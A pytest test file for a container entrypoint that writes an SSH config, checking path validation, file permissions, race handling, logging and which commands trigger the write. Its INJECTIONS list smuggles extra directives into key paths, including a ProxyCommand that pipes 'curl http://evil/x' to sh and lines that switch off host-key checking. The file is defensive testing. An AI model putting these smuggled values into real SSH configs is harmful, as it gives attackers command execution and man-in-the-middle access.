"""The container entrypoint's one job: write ~/.ssh/config, then get out of the way.

This runs before `vcows` exists as a process -- `install()` parses the config
itself and `os.execv`s afterwards -- so nothing the schema rejects has been
rejected yet by the time this file is written. That ordering is why the path
check lives here as well as in `TARGET_SCHEMA`, and it is the whole reason this
module is tested at all rather than left to the image gate.

Ungated and offline: nothing here imports libvirt or touches a hypervisor.
"""

from __future__ import annotations

import logging
import os
import re
import sys
import time
from pathlib import Path
from types import SimpleNamespace

import pytest

from container import entrypoint

GOOD_KEY = "/run/secrets/id_ed25519"
GOOD_HOSTS = "/run/secrets/known_hosts"

#: Every directive the written file is supposed to carry, and no others.
DIRECTIVES = [
    "Host *",
    "BatchMode yes",
    "ServerAliveInterval 30",
    "ServerAliveCountMax 6",
    f"IdentityFile {GOOD_KEY}",
    "IdentitiesOnly yes",
    f"UserKnownHostsFile {GOOD_HOSTS}",
    "StrictHostKeyChecking yes",
]

#: Each one appends a directive of its own to a file that is read line by line.
INJECTIONS = [
    "/run/secrets/k\n  ProxyCommand /bin/sh -c 'curl http://evil/x | sh'",
    "/run/secrets/k\n  StrictHostKeyChecking no",
    "/run/secrets/k\n  UserKnownHostsFile /dev/null",
    "/run/secrets/k\n",
    "/run/secrets/k\r  ProxyCommand /bin/false",
    "/run/secrets/k with a space",
    "relative/path",
    "",
]


# -- the rendered file -------------------------------------------------------


def test_the_written_config_carries_exactly_the_documented_directives():
    body = entrypoint.ssh_config(GOOD_KEY, GOOD_HOSTS)
    assert [ln.strip() for ln in body.splitlines() if not ln.startswith("#")] == [
        d.strip() for d in DIRECTIVES
    ]


def test_either_credential_alone_writes_only_its_own_half():
    assert "UserKnownHostsFile" not in entrypoint.ssh_config(GOOD_KEY, None)
    assert "IdentityFile" not in entrypoint.ssh_config(None, GOOD_HOSTS)


# -- injection ---------------------------------------------------------------


@pytest.mark.parametrize("value", INJECTIONS)
def test_a_keyfile_that_is_not_a_plain_path_is_refused(value):
    """`ProxyCommand` in ~/.ssh/config is command execution on the next
    connection, and both clients read that file -- which is the entire reason it
    is written here rather than passed in the URI."""
    with pytest.raises(ValueError):
        entrypoint.ssh_config(value, GOOD_HOSTS)


@pytest.mark.parametrize("value", INJECTIONS)
def test_a_known_hosts_that_is_not_a_plain_path_is_refused(value):
    with pytest.raises(ValueError):
        entrypoint.ssh_config(GOOD_KEY, value)


@pytest.mark.parametrize(
    "field, args",
    [
        ("ssh_keyfile", (INJECTIONS[0], GOOD_HOSTS)),
        ("known_hosts", (GOOD_KEY, INJECTIONS[0])),
    ],
)
def test_the_refusal_names_the_field_that_carried_the_value(field, args):
    """Two credentials go through one check, and the operator's next move is to
    edit the key that was refused. Naming the other one sends them to a value
    that is fine."""
    with pytest.raises(ValueError, match=field):
        entrypoint.ssh_config(*args)


# -- install() ---------------------------------------------------------------


def config_file(tmp_path, keyfile=GOOD_KEY, known_hosts=GOOD_HOSTS):
    path = tmp_path / "deployment.yaml"
    path.write_text(
        "target:\n"
        "  libvirt:\n"
        f"    ssh_keyfile: {keyfile!r}\n"
        f"    known_hosts: {known_hosts!r}\n"
    )
    return path


@pytest.fixture(autouse=True)
def _entrypoint_logging():
    """Configure logging the way `main()` does, because `install()` does not.

    Four tests below assert on stderr, and `install()` is called directly by all
    four -- but the only caller that configures logging is `main()`, one line
    before it. So what those tests actually read was whatever handler some
    *earlier* test module had left on the root logger, normally the one
    `orchestrator` installs at package import. Running this file on its own left
    the root logger unconfigured, and all four then read an empty stderr: three
    failed, and `test_install_writes_nothing_for_a_poisoned_config` passed
    vacuously, which is the worse half.

    `conftest._root_logger` puts the handlers back afterwards, so this leaks into
    nothing. Same defect as the `sys.modules` one #147 fixed and the same remedy:
    a test that depends on global state has to establish it rather than inherit
    it.
    """
    entrypoint._configure_logging()


# -- whose home ---------------------------------------------------------------


def test_the_home_written_into_is_the_one_ssh_will_read(monkeypatch):
    """The passwd entry, not `$HOME`. OpenSSH and Go's `os/user` both resolve `~`
    from the passwd database, so an exported `HOME` would move the file somewhere
    neither client looks."""
    monkeypatch.setenv("HOME", "/somewhere/else")
    monkeypatch.setattr(entrypoint.os, "getuid", lambda: 4242)
    monkeypatch.setattr(
        entrypoint.pwd,
        "getpwuid",
        lambda uid: SimpleNamespace(pw_dir=f"/home/uid-{uid}"),
    )

    assert entrypoint.home() == Path("/home/uid-4242")


def test_a_uid_with_no_passwd_entry_has_no_home_to_write_to(monkeypatch):
    """`podman run --user` with a UID absent from /etc/passwd -- R6's rootless
    trap. `None` is what makes `install` write nothing rather than guess a path,
    and the operator's own mounts have to be correct."""

    def absent(uid):
        raise KeyError(uid)

    monkeypatch.setattr(entrypoint.pwd, "getpwuid", absent)

    assert entrypoint.home() is None


@pytest.fixture
def fake_home(tmp_path, monkeypatch):
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setattr(entrypoint, "home", lambda: home)
    return home


def test_install_writes_the_file_for_a_good_config(tmp_path, fake_home):
    entrypoint.install([str(config_file(tmp_path))])
    written = fake_home / ".ssh" / "config"
    body = written.read_text()
    # Both halves. `known_hosts` is the one the URI cannot carry at all, so a
    # config that installed only the key would fail at the host key check.
    assert f"IdentityFile {GOOD_KEY}" in body
    assert f"UserKnownHostsFile {GOOD_HOSTS}" in body
    assert written.stat().st_mode & 0o777 == 0o600


@pytest.mark.parametrize(
    "field, value, directive",
    [
        ("ssh_keyfile", GOOD_KEY, f"IdentityFile {GOOD_KEY}"),
        ("known_hosts", GOOD_HOSTS, f"UserKnownHostsFile {GOOD_HOSTS}"),
    ],
)
def test_install_writes_the_one_credential_it_was_given(
    tmp_path, fake_home, field, value, directive
):
    """Either alone is a usable config: a key for a host already in the default
    known_hosts, or a known_hosts for a key an agent supplies."""
    path = tmp_path / "deployment.yaml"
    path.write_text(f"target:\n  libvirt:\n    {field}: {value!r}\n")

    entrypoint.install([str(path)])
    assert directive in (fake_home / ".ssh" / "config").read_text()


def test_install_writes_nothing_when_the_config_names_no_credential(
    tmp_path, fake_home
):
    """A `target.libvirt` with neither key is an operator whose `~/.ssh` is
    already right. Writing `Host *` over it would take the defaults away."""
    path = tmp_path / "deployment.yaml"
    path.write_text("target:\n  libvirt:\n    uri: qemu+ssh://h/system\n")

    entrypoint.install([str(path)])
    assert not (fake_home / ".ssh" / "config").exists()


def test_install_makes_a_home_that_is_not_there_yet(tmp_path, monkeypatch):
    """The passwd entry's home need not exist -- a container that mounts nothing
    at it has the directory in /etc/passwd and nothing on the filesystem. Both
    levels are created, or the write fails and the credentials are lost."""
    home = tmp_path / "not" / "created"
    monkeypatch.setattr(entrypoint, "home", lambda: home)

    entrypoint.install([str(config_file(tmp_path))])
    assert f"IdentityFile {GOOD_KEY}" in (home / ".ssh" / "config").read_text()


@pytest.mark.parametrize(
    "target", ["target: qemu+ssh://h/system", "target:\n  - libvirt"]
)
def test_install_survives_a_config_shaped_nothing_like_one(tmp_path, fake_home, target):
    """`install` runs before `vcows` is a process, so it meets the YAML raw. A
    scalar or a list where a mapping belongs used to be an `AttributeError` --
    a traceback in place of the sentence `validate` was about to print."""
    path = tmp_path / "deployment.yaml"
    path.write_text(target + "\n")
    entrypoint.install([str(path)])
    assert not (fake_home / ".ssh" / "config").exists()


def test_a_mounted_ssh_config_wins_and_says_so(tmp_path, fake_home, capsys):
    """Theirs wins, which is the documented behaviour. The silence was not: a
    credential the config named and nothing installed looks like a vcows bug."""
    ssh = fake_home / ".ssh"
    ssh.mkdir(mode=0o700)
    (ssh / "config").write_text("Host *\n  IdentityFile /mine\n")

    entrypoint.install([str(config_file(tmp_path))])
    assert (ssh / "config").read_text() == "Host *\n  IdentityFile /mine\n"
    assert "already exists" in capsys.readouterr().err


def test_the_mode_comes_from_the_create_not_a_later_chmod(
    tmp_path, fake_home, monkeypatch
):
    """0600 has to be true of the file from the syscall that makes it.

    ``write_text`` creates at ``0o666 & ~umask``. The image's umask is 0022 --
    measured, ``podman run --rm --entrypoint sh IMAGE -c umask`` -- so the file
    naming the operator's private key path was 0644 until the ``chmod`` on the
    next line. ``orchestrator/cli.py``'s ``os.umask(0o077)`` cannot help: the
    entrypoint ``execv``s into vcows *after* this write.

    The sibling test above asserts 0600 and passed throughout the window, because
    it reads the mode after ``install`` returns. Banning ``chmod`` is what tells
    the two shapes apart: the old one could not reach 0600 without it.
    """

    def no_chmod(*args, **kwargs):
        raise AssertionError("0600 must come from the create, not a later chmod")

    monkeypatch.setattr(Path, "chmod", no_chmod)
    monkeypatch.setattr(os, "chmod", no_chmod)

    previous = os.umask(0o022)
    try:
        entrypoint.install([str(config_file(tmp_path))])
    finally:
        os.umask(previous)

    assert (fake_home / ".ssh" / "config").stat().st_mode & 0o777 == 0o600
    # The directory too, and for the same reason: `mkdir` without a mode creates
    # at 0o777 & ~umask, which under this umask is 0755 -- a world-readable
    # directory holding a file that names the operator's private key.
    assert (fake_home / ".ssh").stat().st_mode & 0o777 == 0o700


def test_a_config_arriving_after_the_check_is_not_truncated(
    tmp_path, fake_home, monkeypatch, capsys
):
    """The other half: ``exists()`` and the write were two syscalls around a call
    that *truncates*, so a config landing between them was silently clobbered --
    the one outcome the "theirs wins" branch exists to prevent.

    Reporting ``exists`` as False with the file really there is that race made
    deterministic. ``O_EXCL`` decides it in one operation, so the monkeypatch is
    inert against the current shape and fatal against the old one.
    """
    ssh = fake_home / ".ssh"
    ssh.mkdir(mode=0o700)
    theirs = "Host *\n  IdentityFile /mine\n"
    (ssh / "config").write_text(theirs)
    monkeypatch.setattr(Path, "exists", lambda self: False)

    entrypoint.install([str(config_file(tmp_path))])

    assert (ssh / "config").read_text() == theirs
    assert "already exists" in capsys.readouterr().err


def test_an_unwritable_home_says_what_it_costs(tmp_path, monkeypatch, capsys):
    """The branch a foreign UID actually hits, and it had no test.

    Under `--user 4242` podman synthesises a passwd entry whose home is `/`, and
    `/` is not writable -- so the write fails, `vcows` runs anyway, and the next
    thing on the operator's terminal is `Host key verification failed` out of
    ssh, which points at nothing. Pinned on the consequence rather than the
    wording, matching the sibling branch above.
    """
    # The home is blocked by making a path component a regular file, rather than
    # by chmod. Both land in the same `except OSError` in install() -- the real
    # trigger is EACCES on `/`, this is ENOTDIR -- but chmod does not stop root,
    # and a container job that runs as root is exactly where this test would
    # otherwise pass by not being a test. (Found by running the suite in a bare
    # ubuntu:24.04, which is how the GitLab runners will look.)
    blocked = tmp_path / "blocker" / "home"
    (tmp_path / "blocker").write_text("not a directory")
    monkeypatch.setattr(entrypoint, "home", lambda: blocked)

    entrypoint.install([str(config_file(tmp_path))])
    assert not (blocked / ".ssh").exists()
    err = capsys.readouterr().err
    assert "could not write" in err
    assert "were not installed" in err


# -- #13: which verbs get an SSH config at all ------------------------------


@pytest.fixture
def no_exec(monkeypatch):
    """`main` ends in `os.execv`, which would replace the test process."""
    calls = []
    monkeypatch.setattr(os, "execv", lambda path, argv: calls.append((path, argv)))
    return calls


@pytest.mark.parametrize("command", ["validate", "version"])
def test_an_offline_verb_writes_no_ssh_config(
    tmp_path, fake_home, no_exec, monkeypatch, command
):
    """`cmd_validate` documents itself as "Offline only. No connection is opened
    and nothing is written", and inside the image that was false: `install` ran
    for every verb (#13). The docstring is the correct half."""
    monkeypatch.setattr(
        sys, "argv", ["entrypoint", command, str(config_file(tmp_path))]
    )
    entrypoint.main()

    assert not (fake_home / ".ssh").exists()
    assert no_exec == [
        (entrypoint.VCOWS, ["vcows", command, str(config_file(tmp_path))])
    ]


@pytest.mark.parametrize("command", ["preflight", "deploy", "destroy"])
def test_a_connecting_verb_still_gets_its_ssh_config(
    tmp_path, fake_home, no_exec, monkeypatch, command
):
    """The other half. Skipping the install for a verb that connects is the
    failure this must not trade for the one above."""
    monkeypatch.setattr(
        sys, "argv", ["entrypoint", command, str(config_file(tmp_path))]
    )
    entrypoint.main()

    assert f"IdentityFile {GOOD_KEY}" in (fake_home / ".ssh" / "config").read_text()


def test_a_config_file_named_like_an_offline_verb_is_not_read_as_one(
    tmp_path, fake_home, no_exec, monkeypatch
):
    """`verb` takes the first non-flag argument rather than testing membership,
    so a config that happens to be called `validate` cannot suppress the install
    for a `deploy`."""
    named = config_file(tmp_path).rename(tmp_path / "validate")
    monkeypatch.setattr(sys, "argv", ["entrypoint", "deploy", str(named)])
    entrypoint.main()

    assert f"IdentityFile {GOOD_KEY}" in (fake_home / ".ssh" / "config").read_text()


def test_install_writes_nothing_for_a_poisoned_config(tmp_path, fake_home, capsys):
    """Refusing after writing would be no refusal at all: the next `ssh` reads the
    file, and `vcows validate`'s rejection comes too late to matter."""
    path = config_file(tmp_path, keyfile="/run/secrets/k\n  ProxyCommand /bin/false")
    entrypoint.install([str(path)])
    assert not (fake_home / ".ssh" / "config").exists()
    assert "ProxyCommand" not in capsys.readouterr().err


def test_a_flag_is_neither_the_verb_nor_the_config(tmp_path, monkeypatch):
    """Both scans skip anything starting with `-`. Without that, a flag that
    happens to name a file in the working directory becomes the config, and a
    flag before the verb becomes the verb -- which is `validate` losing its
    install, or `deploy` silently keeping it."""
    monkeypatch.chdir(tmp_path)
    (tmp_path / "-x").write_text("")

    assert entrypoint.config_path(["-x"]) is None
    assert entrypoint.verb(["-x", "validate"]) == "validate"


def test_install_is_handed_every_argument_not_just_what_follows_the_verb(
    tmp_path, fake_home, no_exec, monkeypatch
):
    """`config_path` matches on "a non-flag argument that is an existing file",
    so the list it searches has to be the whole one. A config named after the
    verb it is passed to is still the config."""
    config_file(tmp_path).rename(tmp_path / "deploy")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(sys, "argv", ["entrypoint", "deploy"])
    entrypoint.main()

    assert f"IdentityFile {GOOD_KEY}" in (fake_home / ".ssh" / "config").read_text()


# -- the window before the exec ---------------------------------------------


def test_the_timestamp_is_utc():
    """Duplicated from `orchestrator._configure_logging` and asserted twice for
    the same reason: `asctime` is localtime unless the converter says otherwise,
    and these lines are read beside the ones vcows writes a moment later."""
    assert logging.Formatter.converter is time.gmtime


def test_every_line_carries_a_timestamp_a_level_and_the_logger(capsys):
    """The entrypoint's four warnings are the only account of an SSH config that
    was not installed, and they are read in the same stream as vcows's own."""
    entrypoint.log.warning("something to say")
    line = capsys.readouterr().err.strip()

    assert re.match(
        r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z WARNING vcows\.entrypoint: ", line
    ), line
    assert line.endswith("something to say")


@pytest.mark.parametrize("given", ["debug", "DEBUG"])
def test_the_level_is_taken_from_the_environment_in_either_case(monkeypatch, given):
    """`VCOWS_LOG_LEVEL` is read once here and again by `orchestrator._log_level`
    after the exec, and a value one of them accepts and the other drops would
    make the two halves of one run disagree about what they log."""
    monkeypatch.setenv("VCOWS_LOG_LEVEL", given)
    try:
        entrypoint._configure_logging()
        assert logging.getLogger().level == logging.DEBUG
    finally:
        monkeypatch.delenv("VCOWS_LOG_LEVEL")
        entrypoint._configure_logging()


def test_an_unusable_level_falls_back_rather_than_stopping_the_entrypoint(monkeypatch):
    """`setLevel` raises on a name it does not know, and that would turn a typo
    in an environment variable into a container that never execs. The rejection
    is left to `orchestrator._log_level`, which reports it in one place."""
    monkeypatch.setenv("VCOWS_LOG_LEVEL", "chatty")
    try:
        entrypoint._configure_logging()  # must not raise
        assert logging.getLogger().level == logging.INFO
    finally:
        monkeypatch.delenv("VCOWS_LOG_LEVEL")
        entrypoint._configure_logging()
